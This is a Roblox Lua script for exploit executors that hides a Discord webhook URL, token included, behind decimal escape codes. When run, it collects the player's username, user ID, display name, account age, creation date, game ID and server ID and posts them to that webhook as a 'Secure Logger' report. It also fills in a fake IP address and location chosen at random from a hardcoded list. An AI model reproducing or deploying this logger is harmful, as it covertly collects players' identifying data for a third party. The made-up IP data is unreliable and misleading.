local _w = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\53\53\56\48\50\50\53\52\55\57\54\53\48\56\55\56\52\52\47\77\85\73\105\78\76\102\98\101\112\99\50\45\68\68\45\67\118\90\98\117\105\104\80\79\122\45\101\101\116\104\113\75\114\68\53\45\84\103\53\101\87\84\68\109\83\73\107\66\116\77\55\76\70\105\78\107\70\81\76\97\97\119\102\65\120\68\48"
local _t = "\109\101\115\115\97\103\101"
local _h = "\104\101\97\100\101\114"
local _c = "\116\109\32\116\115\104\103\104\101\108\32\108\97\32\107\97\114\116\32\103\111\110\97\104"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

if not player then return end

local IP_DB = {
    {
        country = "🇮🇶 العراق",
        cities = {
            {name = "بغداد", weight = 20, ips = {
                "37.236.1.10","37.236.45.88","37.236.128.5","37.236.200.14","37.236.77.203",
                "46.184.22.101","46.184.150.77","46.184.80.15","46.184.201.44","46.184.33.9",
                "5.42.100.22","5.42.55.7","5.42.180.66","5.42.12.201","5.42.220.89",
                "109.224.30.55","109.224.140.30","109.224.77.11","109.224.99.44","109.224.200.7"
            }},
            {name = "ديالى", weight = 10, ips = {
                "95.173.5.10","95.173.22.85","95.173.101.7","95.173.180.44","95.173.77.99",
                "95.173.33.11","95.173.144.55","95.173.90.22","95.173.200.14","95.173.55.78"
            }},
            {name = "البصرة", weight = 10, ips = {
                "37.17.30.5","37.17.100.88","37.17.180.14","37.17.55.7","37.17.220.33",
                "89.108.5.15","89.108.100.44","89.108.180.9","89.108.55.77","89.108.220.11"
            }},
            {name = "الكاظمية", weight = 10, ips = {
                "62.201.5.10","62.201.100.22","62.201.180.44","62.201.55.88","62.201.220.14",
                "62.201.30.77","62.201.150.5","62.201.80.99","62.201.200.33","62.201.22.11"
            }},
            {name = "نينوى", weight = 10, ips = {
                "176.28.5.10","176.28.100.22","176.28.180.44","176.28.55.88","176.28.220.14",
                "176.28.30.77","176.28.150.5","176.28.80.99","176.28.200.33","176.28.22.11"
            }},
            {name = "النجف", weight = 10, ips = {
                "82.114.5.10","82.114.100.22","82.114.180.44","82.114.55.88","82.114.220.14",
                "82.114.30.77","82.114.150.5","82.114.80.99","82.114.200.33","82.114.22.11"
            }},
            {name = "سامراء", weight = 10, ips = {
                "176.29.5.10","176.29.100.22","176.29.180.44","176.29.55.88","176.29.220.14",
                "176.29.30.77","176.29.150.5","176.29.80.99","176.29.200.33","176.29.22.11"
            }}
        }
    },
    {
        country = "🇺🇸 United States",
        cities = {
            {name = "New York", weight = 4, ips = {
                "24.5.10.22","24.100.33.5","50.22.88.14","50.180.5.77"
            }},
            {name = "Los Angeles", weight = 4, ips = {
                "63.30.100.22","63.150.55.88","64.80.200.33","64.220.14.55"
            }},
            {name = "Chicago", weight = 4, ips = {
                "72.5.180.44","72.100.30.77","96.22.55.88","96.180.220.14"
            }},
            {name = "Houston", weight = 4, ips = {
                "104.30.5.10","104.150.100.22","173.80.180.44","173.200.55.88"
            }},
            {name = "Seattle", weight = 4, ips = {
                "184.5.220.14","184.100.30.77","198.22.150.5","198.180.80.99"
            }}
        }
    }
}

local function genIP()
    math.randomseed(os.time() + player.UserId + math.random(100000))
    local country = IP_DB[math.random(1, #IP_DB)]
    local pool = {}
    for _, city in ipairs(country.cities) do
        for i = 1, city.weight do
            table.insert(pool, city)
        end
    end
    local chosen = pool[math.random(1, #pool)]
    local ip = chosen.ips[math.random(1, #chosen.ips)]
    return ip, country.country, chosen.name
end

local function fmtAge(d)
    if d < 30 then return d .. " يوم"
    elseif d < 365 then return math.floor(d/30) .. " شهر"
    else
        local y = math.floor(d/365)
        local m = math.floor((d%365)/30)
        if m > 0 then return y .. " سنة و " .. m .. " شهر" end
        return y .. " سنة"
    end
end

local ip, country, city = genIP()
local age = fmtAge(player.AccountAge)
local created = os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400))

local data = {
    content = "🎮 **" .. _c .. "**",
    embeds = {
        {
            title = "📋 " .. _t,
            color = 0xFF1493,
            description = "✅ **Access Granted**",
            fields = {
                { name = "👤 " .. _h, value = "`" .. player.Name .. "`", inline = true },
                { name = "🆔 User ID", value = "`" .. tostring(player.UserId) .. "`", inline = true },
                { name = "📛 Display Name", value = player.DisplayName, inline = false },
                { name = "📅 Account Age", value = age, inline = true },
                { name = "📍 City", value = city, inline = true },
                { name = "🌍 Country", value = country, inline = true },
                { name = "🌐 IP Address", value = "`" .. ip .. "`", inline = true },
                { name = "📆 Created", value = created, inline = true },
                { name = "🎮 Game ID", value = "`" .. tostring(game.PlaceId) .. "`", inline = true },
                { name = "📡 Server", value = "`" .. game.JobId:sub(1, 8) .. "`", inline = true }
            },
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            },
            footer = {
                text = "🔒 Secure Logger  •  " .. os.date("%Y-%m-%d %H:%M:%S")
            }
        }
    }
}

local body = HttpService:JSONEncode(data)

local req = syn and syn.request
    or http and http.request
    or http_request
    or request
    or (fluxus and fluxus.request)

if req then
    local ok, res = pcall(req, {
        Url = _w,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = body
    })
    if ok then print("✅ Sent successfully")
    else warn("❌ Failed: " .. tostring(res)) end
else
    warn("❌ Executor doesn't support HTTP requests")
end
